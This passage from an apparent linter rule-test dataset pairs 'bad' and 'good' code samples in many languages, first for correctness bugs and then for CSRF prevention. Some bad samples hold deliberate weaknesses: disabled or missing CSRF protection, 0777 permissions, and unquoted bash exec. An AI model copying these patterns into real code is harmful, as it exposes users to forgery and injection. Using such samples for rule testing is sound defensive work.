    "code": "d = {'a': 1, 'b': 2}\n# ruleid:dict-del-while-iterate\nfor k,v in d.items():\n    del d[k]",
    "language": "python",
    "description": "INCORRECT** - Deleting from dict while iterating example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "d = []\ne = [1, 2, 3, 4]\n# ok:list-modify-while-iterate\nfor i in e:\n    print(i)\n    d.append(i)",
    "language": "python",
    "description": "CORRECT** - Iterate over a copy or different collection example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class A:\n    def __init__(a, b, c):\n        # ruleid:return-in-init\n        return A(a, b, c)\n\nclass C:\n    def __init__(a, b, c):\n        # ruleid:yield-in-init\n        yield",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "class B:\n    def __init__(a, b, c):\n        # ok:return-in-init\n        return  # Returning None is OK\n\nclass H:\n    def __init__(self, x):\n        # ok:return-in-init\n        return None",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "try:\n  for i in range(3):\n    # ruleid: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\n      break  # This suppresses the exception!\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "try:\n  for i in range(3):\n    # ok: suppressed-exception-handling-finally-break\n    try:\n      1 / 0\n    except ZeroDivisionError:\n      raise ZeroDivisionError(\"Error: you're trying to divide by zero!\")\n    finally:\n      print(\"finally executed\")\nexcept ZeroDivisionError:\n  print(\"outer ZeroDivisionError caught\")",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid:raise-not-base-exception\nraise \"error here\"\n\n# ruleid:raise-not-base-exception\nraise 5",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# ok:raise-not-base-exception\nraise Exception()",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "fout = open(\"example.txt\", 'r')\nprint(\"stuff\")\n# ruleid:writing-to-file-in-read-mode\nfout.write(\"whoops, I'm not writable!\")\nfout.close()",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "fout = open(\"example.txt\", 'w')\nprint(\"stuff\")\n# ok:writing-to-file-in-read-mode\nfout.write(\"I'm writable!\")\nfout.close()",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def test1():\n    # ruleid:file-object-redefined-before-close\n    fin = open(\"file1.txt\", 'r')\n    data = fin.read()\n    fin = open(\"file2.txt\", 'r')  # First file never closed!\n    data2 = fin.read()\n    fin.close()",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "def test2():\n    #ok:file-object-redefined-before-close\n    fin = open(\"file1.txt\", 'r')\n    data = fin.read()\n    fin.close()\n\n    fin = open(\"file2.txt\", 'r')\n    data2 = fin.read()\n    fin.close()",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def main_d():\n    fout = tempfile.NamedTemporaryFile('w')\n    debug_print(astr)\n    fout.write(astr)\n\n    # ruleid:tempfile-without-flush\n    cmd = [binary_name, fout.name, *[str(path) for path in targets]]",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "def main():\n    with tempfile.NamedTemporaryFile(\"w\") as fout:\n        debug_print(astr)\n        fout.write(astr)\n        # ok:tempfile-without-flush\n        fout.flush()\n        cmd = [binary_name, fout.name, *[str(path) for path in targets]]",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid: cannot-cache-generators\n@functools.lru_cache(maxsize=10)\ndef generator():\n    yield 1",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# ok: cannot-cache-generators\n@functools.lru_cache(maxsize=10)\ndef not_a_generator():\n    return 1",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid:useless-eqeq\nx == x  # Always True\n\n# ruleid:useless-eqeq\nprint(x != x)  # Always False",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "x = 'foo'\n\n# ruleid: is-not-is-not\nif x is (not 'hello there'):  # This converts 'hello there' to boolean first!\n    pass\n\n# ruleid: is-not-is-not\nif x is (not None):  # This checks if x is False!\n    pass",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# OK\nif x is not None:  # Proper identity check\n    pass",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid:string-concat-in-list\nbad = [\"123\" \"456\" \"789\"]  # Results in [\"123456789\"], not 3 elements!\n\nbad = [\n    # ruleid:string-concat-in-list\n    \"abc\"\n    \"cde\"\n    \"efg\",\n    \"hijk\"\n]",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# ok:string-concat-in-list\ngood = [\"123\", \"456\", \"789\"]",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class TestSomething(unittest.TestCase):\n    def test_something(self):\n        # ruleid: test-is-missing-assert\n        a == b  # This does nothing!",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "class TestSomething(unittest.TestCase):\n    def test_something(self):\n        # ok: test-is-missing-assert\n        assert a == b, \"message\"",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "import pdb as db\n\ndef foo():\n    # ruleid:pdb-remove\n    db.set_trace()",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class A:\n    def method1(self, args):\n        pass\n\nclass B:\n    def method1(self, args):\n        print('hello there')\n\n# ruleid: baseclass-attribute-override\nclass C(A, B):  # Both A and B have method1!\n    def __init__():\n        print(\"initialized\")",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "sock = socket.socket(af, socktype, proto)\n\ntry:\n    # ruleid: socket-shutdown-close\n    sock.shutdown(socket.SHUT_RDWR)\n    sock.close()  # Not called if shutdown fails!\nexcept OSError:\n    pass",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "try:\n    # ok: socket-shutdown-close\n    sock.shutdown(socket.SHUT_RDWR)\nexcept OSError:\n    pass\n\ntry:\n    sock.close()\nexcept OSError:\n    pass",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class Bad(models.Model):\n    title = models.CharField(max_length=255)\n    slug = models.SlugField(unique=True, max_length=255)\n\n    # ruleid: django-db-model-save-super\n    def save(self, *args, **kwargs):\n        if not self.slug:\n            self.slug = slugify(self.title)\n        # Missing super().save()!",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "class Post(models.Model):\n    title = models.CharField(max_length=255)\n    slug = models.SlugField(unique=True, max_length=255)\n\n    # ok: django-db-model-save-super\n    def save(self, *args, **kwargs):\n        if not self.slug:\n            self.slug = slugify(self.title)\n        super(Post, self).save(*args, **kwargs)",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class FakeModel(Model):\n    # ruleid: string-field-must-set-null-true\n    fieldTwo = models.CharField(\n        unique=True,\n        blank=True,\n        max_length=30\n    )",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "class FakeModel(Model):\n    # ok: string-field-must-set-null-true\n    fieldThree = models.CharField(\n        unique=True,\n        null=True,\n        blank=True,\n        max_length=100\n    )",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class FakeModel(models.Model):\n    # ruleid: nontext-field-must-set-null-true\n    fieldInt = models.IntegerField(\n        blank=True,\n        max_value=30\n    )",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "class FakeModel(models.Model):\n    # ok: nontext-field-must-set-null-true\n    fieldIntNull = models.IntegerField(\n        null=True,\n        blank=True,\n        max_value=100\n    )",
    "language": "python",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "from flask import Flask\n\napp = Flask(__name__)\n\n# ruleid: flask-duplicate-handler-name\n@app.route('/hello')\ndef hello():\n    return 'hello'\n\n@app.route('/hi', methods=[\"POST\"])\ndef hello():  # Same function name!\n  return 'hi'",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "@app.route('/', method=\"GET\")\ndef handler_with_get_json(ff):\n  # ruleid:avoid-accessing-request-in-wrong-handler\n  r = request.json  # GET requests don't have a body!\n  return r",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def test_bad_is_1():\n    # ruleid:bad-operator-in-filter\n    Model.query.filter(Model.id is 5).first()\n\ndef test_bad_and_1():\n    # ruleid:bad-operator-in-filter\n    Model.query.filter(Model.id == 5 and Model.name == 'hi').first()",
    "language": "python",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "const [actionsExpanded, setActionsExpanded] = useState<boolean>(false);\n\n<Button\n  onClick={() => {\n    // ruleid:calling-set-state-on-current-state\n    setActionsExpanded(actionsExpanded);  // This does nothing!\n  }}\n>",
    "language": "jsx",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "<Button\n  onClick={() => {\n    // ok\n    setActionsExpanded(!actionsExpanded);  // Toggle the state\n  }}\n>",
    "language": "jsx",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "function name2() {\n  // ruleid: missing-template-string-indicator\n  return `this is {start.line}`  // Missing $ before {\n}",
    "language": "javascript",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "function name() {\n  // ok: missing-template-string-indicator\n  return `this is ${start.line}`\n}",
    "language": "javascript",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "// ruleid:useless-assignment\nvar x1 = 1;\nx1 = 2;  // First assignment is useless\n\n// ruleid:useless-assignment\nlet x2 = 1;\nx2 = 2;",
    "language": "javascript",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "// ok:useless-assignment\nx4 = {value1: 42};\nx4 = {x4, value2: 43};  // Uses previous value\n\n// ok:useless-assignment\ny = [1, 2];\ny = y.map(function(e) { return e * 2; });",
    "language": "javascript",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "// ruleid:no-stringify-keys\nhashed[JSON.stringify(obj)] = obj;",
    "language": "javascript",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "import stableStringify from \"json-stable-stringify\";\n\n//ok\nhashed[stableStringify(obj)] = obj;",
    "language": "javascript",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "// ruleid:eqeq-is-bad\nx == x  // Always true",
    "language": "javascript",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "func() {\n    values := []string{\"a\", \"b\", \"c\"}\n    var funcs []func()\n    // ruleid:exported_loop_pointer\n    for _, val := range values {\n        funcs = append(funcs, func() {\n            fmt.Println(&val)  // All functions print the same pointer!\n        })\n    }\n}",
    "language": "go",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "func() {\n    values := []string{\"a\", \"b\", \"c\"}\n    var funcs []func()\n    // ok:exported_loop_pointer\n    for _, val := range values {\n        val := val // pin! Create a new variable\n        funcs = append(funcs, func() {\n            fmt.Println(&val)\n        })\n    }\n}",
    "language": "go",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "func a(p string) {\n\t// ruleid: use-filepath-join\n\tfmt.Println(path.Join(p, \"baz\"))\n}",
    "language": "go",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "func a(p string) {\n\t// ok: use-filepath-join\n\tfmt.Println(filepath.Join(a.Path, \"baz\"))\n}",
    "language": "go",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "func mainInt16Ex1() {\n\t// ruleid: integer-overflow-int16\n\tbigValue, err := strconv.Atoi(\"2147483648\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tvalue := int16(bigValue)  // Overflow!\n\tfmt.Println(value)\n}",
    "language": "go",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "func test_chmod() {\n\t// ruleid: incorrect-default-permission\n\terr := os.Chmod(\"/tmp/somefile\", 0777)\n}\n\nfunc test_mkdir() {\n\t// ruleid: incorrect-default-permission\n\terr := os.Mkdir(\"/tmp/mydir\", 0777)\n}",
    "language": "go",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "func test_chmod() {\n\t// ok: incorrect-default-permission\n\terr := os.Chmod(\"/tmp/somefile\", 0400)\n}\n\nfunc test_mkdir() {\n\t// ok: incorrect-default-permission\n\terr := os.MkdirAll(\"/tmp/mydir\", 0600)\n}",
    "language": "go",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "var y = \"hello\";\n// ruleid:eqeq-is-bad\nfmt.Println(y == y)  // Always true",
    "language": "go",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "public class Example {\n    public int foo(String a, int b) {\n        // ruleid:no-string-eqeq\n        if (a == \"hello\") return 1;\n        // ruleid:no-string-eqeq\n        if (\"hello\" == a) return 2;\n    }\n}",
    "language": "java",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "public class Example {\n    public int foo(String a, int b) {\n        //ok:no-string-eqeq\n        if (b == 2) return -1;  // Primitives are OK\n        //ok:no-string-eqeq\n        if (null == \"hello\") return 12;  // null checks are OK\n    }\n}",
    "language": "java",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class Bar {\n    void main() {\n        boolean myBoolean;\n\n        // ruleid:eqeq\n        if (myBoolean == myBoolean) {\n            continue;\n        }\n\n        // ruleid:eqeq\n        if (myBoolean != myBoolean) {\n            continue;\n        }\n    }\n}",
    "language": "java",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "class Bar {\n    void main() {\n        boolean myBoolean;\n\n        // ruleid:assignment-comparison\n        if (myBoolean = true) {  // Assignment, not comparison!\n            continue;\n        }\n    }\n}",
    "language": "java",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "// ok:assignment-comparison\nif (myBoolean) {\n}",
    "language": "java",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "#include <stdlib.h>\n\nint main() {\n    const char *buf = \"\";\n\n    // ruleid:incorrect-use-ato-fn\n    int i = atoi(buf);\n\n    // ruleid:incorrect-use-ato-fn\n    long j = atol(buf);\n\n    // ruleid:incorrect-use-ato-fn\n    long long k = atoll(buf);\n}",
    "language": "c",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "#include <stdlib.h>\n\nint main() {\n    const char *buf = \"\";\n\n    // ok:incorrect-use-ato-fn\n    long l = strtol(buf, NULL, 10);\n\n    // ok:incorrect-use-ato-fn\n    long long m = strtol(buf, NULL, 10);\n}",
    "language": "c",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "const char *float_str = \"3.1415926535897932384626433832\";\n\nfloat f;\n// ruleid:incorrect-use-sscanf-fn\nread = sscanf(float_str, \"%f\", &f);\n\nint i;\n// ruleid:incorrect-use-sscanf-fn\nread = sscanf(int_str, \"%d\", &i);",
    "language": "c",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "// ok:incorrect-use-sscanf-fn\nf = strtof(float_str, NULL);\n\n// ok:incorrect-use-sscanf-fn\nli = strtol(int_str, NULL, 0);",
    "language": "c",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "static bool IsApproximatelyEqual(double value1, double value2, double epsilon)\n{\n   double divisor = Math.Max(value1, value2);\n   //ruleid: correctness-double-epsilon-equality\n   return Math.Abs((value1 - value2) / divisor) <= Double.Epsilon;\n}\n\nstatic bool lazyEqualLeftCompare(double v1, double v2){\n   //ruleid: correctness-double-epsilon-equality\n   return Math.Abs(v1 - v2) <= Double.Epsilon;\n}",
    "language": "csharp",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "static bool isZero(double arg){\n   double zero = 0;\n   //ok - comparing to zero is acceptable\n   return Math.Abs(arg - zero) <= Double.Epsilon;\n}",
    "language": "csharp",
    "description": "CORRECT** - Use the framework's `Equals()` method or a more appropriate epsilon value example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "// Creates a RegionInfo using the ISO 3166 two-letter code.\nRegionInfo myRI1 = new RegionInfo( \"US\" );\n\nusing (AnonymousPipeServerStream pipeServer = ...){\nusing(StreamWriter sw = new StreamWriter(pipeServer)){\n   //ruleid: correctness-regioninfo-interop\n   sw.WriteLine(myRI1);  // Two-letter code may not persist correctly\n}}",
    "language": "csharp",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "// Creates a RegionInfo using a CultureInfo.LCID.\nRegionInfo myRI2 = new RegionInfo( new CultureInfo(\"en-US\",false).LCID );\n\nusing(StreamWriter sw = new StreamWriter(pipeServer)){\n   //ok\n   sw.WriteLine(myRI2);\n}",
    "language": "csharp",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def createbad\n  @article = Article.new(title: \"...\", body: \"...\")\n  @article.save\n  # ruleid: rails-no-render-after-save\n  render @article\nend",
    "language": "ruby",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "def create\n  @article = Article.new(title: \"...\", body: \"...\")\n\n  if @article.save\n    redirect_to @article  # Use redirect, not render\n  else\n    # ok: rails-no-render-after-save\n    render :new, status: :unprocessable_entity\n  end\nend",
    "language": "ruby",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def bad1(){\n   val color = \"blue\"\n   val strings = List(\"blue\", \"bob\")\n   // ruleid: positive-number-index-of\n   if(strings.indexOf(color) > 0){  // Misses index 0!\n      println(\"This is if statement\");\n   }\n}",
    "language": "scala",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "def ok1() {\n   val color = \"blue\"\n   val strings = List(\"blue\", \"bob\")\n   // ok: positive-number-index-of\n   if(strings.indexOf(color) > -1){  // Correct: checks all indices\n      println(\"This is if statement\");\n   }\n}\n\ndef ok2(){\n   val name = \"bob\"\n   // ok: positive-number-index-of\n   if(name.indexOf(\"b\") >= 0){  // Also correct\n      println(\"This is if statement\");\n   }\n}",
    "language": "scala",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid: atom_exhaustion\nString.to_atom(\"dynamic\")\n\n# ruleid: atom_exhaustion\nList.to_atom(~c\"dynamic\")",
    "language": "elixir",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid: unquoted-variable-expansion-in-command\nexec $foo\n\n# ruleid: unquoted-variable-expansion-in-command\nexec ${foo}\n\n# ruleid: unquoted-variable-expansion-in-command\nexec $1",
    "language": "bash",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# ok: unquoted-variable-expansion-in-command\nexec \"$foo\"\n\n# ok: unquoted-variable-expansion-in-command\nexec \"${foo}\"\n\n# ok: unquoted-variable-expansion-in-command\nexec \"$1\"",
    "language": "bash",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "# ruleid: unquoted-command-substitution-in-command\nexec $(foo)\n\n# ruleid: unquoted-command-substitution-in-command\nexec `foo`",
    "language": "bash",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "# ok: unquoted-command-substitution-in-command\nexec \"$(foo)\"\n\n# ok: unquoted-command-substitution-in-command\nexec \"`foo`\"",
    "language": "bash",
    "description": "CORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "let test xs ys =\n  (* ruleid:physical-not-equal *)\n  if xs != ys\n  then 1\n  else 2\n\nlet test2 xs ys =\n  (* ruleid:physical-equal *)\n  if xs == ys\n  then 1\n  else 2",
    "language": "ocaml",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "let test a b =\n  (* ruleid:useless-compare *)\n  let c = compare (a+b) (a+b) in  (* Always returns 0 *)\n  if c <> 0 then c\n  else\n    compare a b\n\nlet test a b =\n  (* ruleid:useless-equal *)\n  if a+b = a+b  (* Always true *)\n  then 1\n  else 2",
    "language": "ocaml",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "let test a b =\n  (* ruleid:ocamllint-useless-if *)\n  if foo\n  then a+b\n  else a+b  (* Both branches are identical! *)",
    "language": "ocaml",
    "description": "INCORRECT** example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "class CustomStrategy\n    def initialize(controller)\n      @controller = controller\n    end\n\n    def handle_unverified_request\n      # Custom behaviour for unverfied request\n    end\n  end\n\n  class ApplicationController < ActionController::Base\n    # ruleid: rails-skip-forgery-protection\n    skip_forgery_protection\n  end",
    "language": "ruby",
    "description": "disables CSRF protection entirely"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "class ApplicationController2 < ActionController::Base\n    # ok: rails-skip-forgery-protection\n  end",
    "language": "ruby",
    "description": "CSRF protection enabled by default"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "# ruleid:missing-csrf-protection\nclass DangerousController < ActionController::Base\n\n  puts \"do more stuff\"\n\nend",
    "language": "ruby",
    "description": "controller without protect_from_forgery"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "# ok:missing-csrf-protection\nclass OkController < ActionController::Base\n\n  protect_from_forgery :with => :exception\n\n  puts \"do more stuff\"\n\nend\n\n# ok:missing-csrf-protection\nclass OkController < ActionController::Base\n\n  protect_from_forgery prepend: true, with: :exception\n\n  puts \"do more stuff\"\n\nend",
    "language": "ruby",
    "description": "controller with protect_from_forgery"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "function bad() {\n    // ruleid:detect-no-csrf-before-method-override\n    express.csrf()\n    express.methodOverride()\n}",
    "language": "javascript",
    "description": "Incorrect (csrf() before methodOverride() allows bypass) example for Prevent Cross-Site Request Forgery"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "function ok() {\n    // ok:detect-no-csrf-before-method-override\n    express.methodOverride()\n    express.csrf()\n}",
    "language": "javascript",
    "description": "Correct (methodOverride() before csrf()) example for Prevent Cross-Site Request Forgery"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
    "code": "var cookieParser = require('cookie-parser') //for cookie parsing\n// var csrf = require('csurf') //csrf module\nvar bodyParser = require('body-parser') //for body parsing\n\nvar express = require('express')\n\n// setup route middlewares\nvar csrfProtection = csrf({\n    cookie: true\n})\nvar parseForm = bodyParser.urlencoded({\n    extended: false\n})\n\n// ruleid: express-check-csurf-middleware-usage\nvar app = express()\n\n// parse cookies\napp.use(cookieParser())\n\napp.get('/form', csrfProtection, function(req, res) {\n    // generate and pass the csrfToken to the view\n    res.render('send', {\n        csrfToken: req.csrfToken()\n    })\n})\n\napp.post('/process', parseForm, csrfProtection, function(req, res) {\n    res.send('data is being processed')\n})\n\napp.post('/bad', parseForm, function(req, res) {\n    res.send('data is being processed')\n})",
    "language": "javascript",
    "description": "Express app without csurf middleware"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "good",
    "code": "var csrf = require('csurf')\nvar express = require('express')\n\n// ok: express-check-csurf-middleware-usage\nvar app = express()\napp.use(csrf({ cookie: true }))",
    "language": "javascript",
    "description": "include csurf or csrf middleware"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Cross-Site Request Forgery",
    "type": "bad",
